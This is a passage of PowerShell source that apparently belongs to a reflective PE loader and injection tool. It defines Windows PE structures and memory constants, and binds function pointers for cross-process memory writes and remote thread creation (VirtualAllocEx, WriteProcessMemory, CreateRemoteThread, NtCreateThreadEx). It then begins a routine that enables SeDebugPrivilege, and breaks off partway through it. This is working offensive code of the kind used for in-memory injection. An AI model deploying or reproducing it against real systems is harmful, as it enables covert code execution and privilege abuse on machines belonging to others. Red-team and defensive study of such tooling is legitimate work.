		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
	
		$LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$LocalFreeDelegate = Get-DelegateType @([IntPtr])
		$LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
